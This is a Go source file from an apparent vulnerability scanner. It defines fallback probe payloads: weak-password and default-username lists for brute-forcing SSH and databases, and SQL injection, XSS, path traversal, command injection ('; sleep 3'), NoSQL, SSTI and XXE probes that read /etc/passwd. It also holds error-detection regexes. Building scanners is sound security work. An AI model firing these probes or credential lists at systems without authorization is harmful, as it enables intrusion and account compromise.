package payload

import (
	"log/slog"
	"regexp"
	"sync"

	"vulnscan-backend/model"
)

var fallbackWarnOnce sync.Map

// LogFallbackOnce 知识库无数据时仅告警一次（按 category）。
func LogFallbackOnce(category string) {
	if _, loaded := fallbackWarnOnce.LoadOrStore(category, true); loaded {
		return
	}
	slog.Warn("[Knowledge] 使用最小内置兜底，请在「知识库 → 数据文库」维护正式数据",
		"category", category)
}

// MinimalPasswords 弱口令/爆破兜底（极少量）。
func MinimalPasswords() []string {
	return []string{
		"", "admin", "root", "123456", "12345678",
		"password", "admin123", "root123", "P@ssw0rd", "test",
	}
}

// MinimalUsernamesForPort 按端口的少量默认用户名。
func MinimalUsernamesForPort(port int) []string {
	switch port {
	case 22:
		return []string{"root", "admin", "ubuntu", "centos", "ec2-user"}
	case 3306:
		return []string{"root", "admin", "mysql"}
	case 5432:
		return []string{"postgres", "admin"}
	default:
		return []string{"admin", "root"}
	}
}

// MinimalSQLiErrorPayloads 最小 SQLi 探测 payload。
func MinimalSQLiErrorPayloads(db string) []string {
	_ = db
	return []string{`'`, `"`, `' OR '1'='1'-- `}
}

type MinimalTimePayload struct {
	Value string
	Type  string
}

func MinimalSQLiTimePayloads() []MinimalTimePayload {
	return []MinimalTimePayload{{Value: `' OR SLEEP(3)-- `, Type: "MySQL"}}
}

func MinimalSQLiBooleanPairs() []BooleanPair {
	return []BooleanPair{
		{TruePayload: `' OR '1'='1'-- `, FalsePayload: `' OR '1'='2'-- `},
	}
}

func MinimalSQLiErrorPatterns() []model.VulnPayloadPattern {
	return []model.VulnPayloadPattern{
		{Name: "sql_syntax", Pattern: `(?i)SQL syntax`, Severity: "high"},
		{Name: "mysql_error", Pattern: `(?i)mysql_`, Severity: "high"},
		{Name: "odbc_error", Pattern: `(?i)ODBC.*Driver`, Severity: "high"},
	}
}

func CompilePatterns(patterns []model.VulnPayloadPattern) []*regexp.Regexp {
	out := make([]*regexp.Regexp, 0, len(patterns))
	for _, p := range patterns {
		if re, err := regexp.Compile(p.Pattern); err == nil {
			out = append(out, re)
		}
	}
	return out
}

// MinimalXSSPayloads 最小 XSS 探测。
func MinimalXSSPayloads(canary string) []XSSPayloadEntry {
	return []XSSPayloadEntry{
		{Value: `<script>` + canary + `</script>`, Expect: canary, Context: "html"},
	}
}

func MinimalDOMSinkPatterns() []model.VulnPayloadPattern {
	return []model.VulnPayloadPattern{{Name: "eval", Pattern: `\beval\s*\(`, Severity: "medium"}}
}

func MinimalDOMSourcePatterns() []model.VulnPayloadPattern {
	return []model.VulnPayloadPattern{{Name: "location", Pattern: `location\.`, Severity: "info"}}
}

// MinimalLFIPayload LFI 最小路径穿越探测。
type MinimalLFIPayload struct {
	Value    string
	OS       string
	Variant  string
	Evidence string
}

func MinimalLFIPayloads() []MinimalLFIPayload {
	return []MinimalLFIPayload{
		{Value: "../../../../etc/passwd", OS: "linux", Variant: "basic", Evidence: "root:x:0:0"},
		{Value: "....\\....\\windows\\win.ini", OS: "windows", Variant: "basic", Evidence: "[fonts]"},
	}
}

func MinimalCMDiTimePayloads() []string {
	return []string{"; sleep 3", "| sleep 3"}
}

func MinimalCMDiOutputPayloads(canary string) []string {
	return []string{"; echo " + canary}
}

func MinimalNoSQLiOperators() []string {
	return []string{"[$gt]", "[$ne]="}
}

func MinimalSSTIMathPayloads() []struct {
	Payload, Expect, Engine string
} {
	return []struct {
		Payload, Expect, Engine string
	}{{"{{7*7}}", "49", "Jinja2"}}
}

func MinimalXXEFilePayload() (payload, evidence, file string) {
	return `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		"root:x:0:0", "/etc/passwd"
}

func MinimalUsernamesForService(service string) []string {
	switch service {
	case "SSH", "FTP":
		return []string{"root", "admin"}
	case "MySQL", "MSSQL":
		return []string{"root"}
	default:
		return []string{"admin", "root"}
	}
}
